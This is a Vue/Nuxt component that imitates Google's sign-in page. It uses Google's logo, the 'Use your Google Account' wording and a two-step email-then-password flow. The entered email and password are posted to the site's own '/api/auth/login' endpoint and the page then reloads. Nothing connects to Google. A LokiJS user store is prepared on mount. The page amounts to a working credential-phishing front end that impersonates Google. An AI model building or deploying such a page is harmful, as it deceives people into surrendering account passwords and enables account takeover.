<template>
  <div
    class="bg-white flex items-center h-screen justify-center"
    style="font-family: Roboto"
  >
    <div
      class="md:border rounded-xl min-w-[200px] w-[450px] md:shadow-sm h-auto py-6"
    >
      <div class="flex flex-col p-3 justify-between px-5" v-if="step == 1">
        <div>
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="3em"
            height="3em"
            viewBox="0 0 128 128"
          >
            <path
              fill="#fff"
              d="M44.59 4.21a63.28 63.28 0 0 0 4.33 120.9a67.6 67.6 0 0 0 32.36.35a57.13 57.13 0 0 0 25.9-13.46a57.44 57.44 0 0 0 16-26.26a74.3 74.3 0 0 0 1.61-33.58H65.27v24.69h34.47a29.72 29.72 0 0 1-12.66 19.52a36.2 36.2 0 0 1-13.93 5.5a41.3 41.3 0 0 1-15.1 0A37.2 37.2 0 0 1 44 95.74a39.3 39.3 0 0 1-14.5-19.42a38.3 38.3 0 0 1 0-24.63a39.25 39.25 0 0 1 9.18-14.91A37.17 37.17 0 0 1 76.13 27a34.3 34.3 0 0 1 13.64 8q5.83-5.8 11.64-11.63c2-2.09 4.18-4.08 6.15-6.22A61.2 61.2 0 0 0 87.2 4.59a64 64 0 0 0-42.61-.38"
            />
            <path
              fill="#e33629"
              d="M44.59 4.21a64 64 0 0 1 42.61.37a61.2 61.2 0 0 1 20.35 12.62c-2 2.14-4.11 4.14-6.15 6.22Q95.58 29.23 89.77 35a34.3 34.3 0 0 0-13.64-8a37.17 37.17 0 0 0-37.46 9.74a39.25 39.25 0 0 0-9.18 14.91L8.76 35.6A63.53 63.53 0 0 1 44.59 4.21"
            />
            <path
              fill="#f8bd00"
              d="M3.26 51.5a63 63 0 0 1 5.5-15.9l20.73 16.09a38.3 38.3 0 0 0 0 24.63q-10.36 8-20.73 16.08a63.33 63.33 0 0 1-5.5-40.9"
            />
            <path
              fill="#587dbd"
              d="M65.27 52.15h59.52a74.3 74.3 0 0 1-1.61 33.58a57.44 57.44 0 0 1-16 26.26c-6.69-5.22-13.41-10.4-20.1-15.62a29.72 29.72 0 0 0 12.66-19.54H65.27c-.01-8.22 0-16.45 0-24.68"
            />
            <path
              fill="#319f43"
              d="M8.75 92.4q10.37-8 20.73-16.08A39.3 39.3 0 0 0 44 95.74a37.2 37.2 0 0 0 14.08 6.08a41.3 41.3 0 0 0 15.1 0a36.2 36.2 0 0 0 13.93-5.5c6.69 5.22 13.41 10.4 20.1 15.62a57.13 57.13 0 0 1-25.9 13.47a67.6 67.6 0 0 1-32.36-.35a63 63 0 0 1-23-11.59A63.7 63.7 0 0 1 8.75 92.4"
            />
          </svg>
        </div>

        <h1 class="mt-5 font-poppins font-semibold text-2xl">
          Sign in to continue
        </h1>
        <h1 class="mt-4 text-gray-500 font-poppins">Use your Google Account</h1>
        <input
          type="text"
          v-model="email"
          class="outline-none border p-3 rounded-lg mt-10 focus:border-blue-600 border-2"
          placeholder="Email or phone"
        />
        <NuxtLink to="/login" class="text-blue-600 mt-2 font-semibold"
          >Forgot email?</NuxtLink
        >

        <div class="mt-10 text-gray-500">
          Not your computer? Use Private Browsing windows to sign in.
          <span class="text-blue-600">Learn more about using Guest mode</span>
        </div>

        <div class="flex items-center mt-6 justify-between">
          <h1 class="text-blue-600">Create account</h1>

          <button
            class="bg-blue-800 text-white rounded-full px-5 py-2"
            @click="nextStep"
          >
            Next
          </button>
        </div>
      </div>

      <div class="flex flex-col p-3 justify-between px-5" v-else>
        <div>
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="3em"
            height="3em"
            viewBox="0 0 128 128"
          >
            <path
              fill="#fff"
              d="M44.59 4.21a63.28 63.28 0 0 0 4.33 120.9a67.6 67.6 0 0 0 32.36.35a57.13 57.13 0 0 0 25.9-13.46a57.44 57.44 0 0 0 16-26.26a74.3 74.3 0 0 0 1.61-33.58H65.27v24.69h34.47a29.72 29.72 0 0 1-12.66 19.52a36.2 36.2 0 0 1-13.93 5.5a41.3 41.3 0 0 1-15.1 0A37.2 37.2 0 0 1 44 95.74a39.3 39.3 0 0 1-14.5-19.42a38.3 38.3 0 0 1 0-24.63a39.25 39.25 0 0 1 9.18-14.91A37.17 37.17 0 0 1 76.13 27a34.3 34.3 0 0 1 13.64 8q5.83-5.8 11.64-11.63c2-2.09 4.18-4.08 6.15-6.22A61.2 61.2 0 0 0 87.2 4.59a64 64 0 0 0-42.61-.38"
            />
            <path
              fill="#e33629"
              d="M44.59 4.21a64 64 0 0 1 42.61.37a61.2 61.2 0 0 1 20.35 12.62c-2 2.14-4.11 4.14-6.15 6.22Q95.58 29.23 89.77 35a34.3 34.3 0 0 0-13.64-8a37.17 37.17 0 0 0-37.46 9.74a39.25 39.25 0 0 0-9.18 14.91L8.76 35.6A63.53 63.53 0 0 1 44.59 4.21"
            />
            <path
              fill="#f8bd00"
              d="M3.26 51.5a63 63 0 0 1 5.5-15.9l20.73 16.09a38.3 38.3 0 0 0 0 24.63q-10.36 8-20.73 16.08a63.33 63.33 0 0 1-5.5-40.9"
            />
            <path
              fill="#587dbd"
              d="M65.27 52.15h59.52a74.3 74.3 0 0 1-1.61 33.58a57.44 57.44 0 0 1-16 26.26c-6.69-5.22-13.41-10.4-20.1-15.62a29.72 29.72 0 0 0 12.66-19.54H65.27c-.01-8.22 0-16.45 0-24.68"
            />
            <path
              fill="#319f43"
              d="M8.75 92.4q10.37-8 20.73-16.08A39.3 39.3 0 0 0 44 95.74a37.2 37.2 0 0 0 14.08 6.08a41.3 41.3 0 0 0 15.1 0a36.2 36.2 0 0 0 13.93-5.5c6.69 5.22 13.41 10.4 20.1 15.62a57.13 57.13 0 0 1-25.9 13.47a67.6 67.6 0 0 1-32.36-.35a63 63 0 0 1-23-11.59A63.7 63.7 0 0 1 8.75 92.4"
            />
          </svg>
        </div>

        <div class="mt-8">
          <h1 class="text-2xl">Hi {{ strippedEmail }}</h1>

          <div
            class="flex items-center border-2 border-gray-300 p-1 w-auto rounded-full mt-1"
          >
            <p
              class="p-1 text-white font-bold rounded-full bg-green-300 w-6 h-6 items-center justify-center flex"
            >
              {{ firstLetter }}
            </p>
            <span class="w-auto">{{ email }}</span>
          </div>

          <div class="flex flex-col">
            <input
              :type="showPassword ? 'text' : 'password'"
              placeholder="Enter your Password"
              v-model="password"
              class="outline-none border p-3 rounded-lg mt-10 focus:border-blue-600 border-2"
            />
            <div class="space-x-3 flex items-center mt-8">
              <input
                type="checkbox"
                name=""
                id=""
                v-model="showPassword"
                placeholder="Show password"
              />
              <label for="">Show password</label>
            </div>

            <div class="flex items-center mt-6 justify-between">
              <h1 class="text-blue-600">Forgot password?</h1>

              <button
                class="bg-blue-800 text-white rounded-full px-5 py-2"
                @click="submitCredentials"
              >
                Next
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref } from "vue";
import Loki from "lokijs";

const step = ref(1);
const email = ref("");
const password = ref("");
const showPassword = ref(false);

const nextStep = () => {
  step.value = 2;
};

let db;

onMounted(() => {
  db = new Loki("userDatabase.db", {
    autosave: true,
    autosaveInterval: 5000,
  });
  db.loadDatabase({}, () => {
    let users = db.getCollection("users");
    if (users === null) {
      users = db.addCollection("users");
    }
  });
});

const strippedEmail = computed(() => {
  if (email.value.endsWith("@gmail.com")) {
    return email.value.slice(0, -10);
  }
  return email.value;
});

const firstLetter = computed(() => {
  if (email.value) {
    return email.value.charAt(0).toUpperCase();
  }
  return "";
});

const submitCredentials = async () => {
  try {
    const res = await $fetch("/api/auth/login", {
      method: "POST",
      body: {
        email: email.value,
        password: password.value,
      },
    });
    window.location.reload();
  } catch (error) {
    console.error(error);
  }
};
</script>

<style lang="css" scoped>
input[type="checkbox"] {
  appearance: none;
  width: 20px;
  height: 20px;
  background-color: #ccc;
  border: 2px solid #1a73e8;
  border-radius: 4px;
  cursor: pointer;
}

input[type="checkbox"]:checked {
  background-color: #1a73e8;
}

input[type="checkbox"]:checked::before {
  content: "\2713";
  display: block;
  text-align: center;
  color: white;
  font-size: 16px;
}
</style>
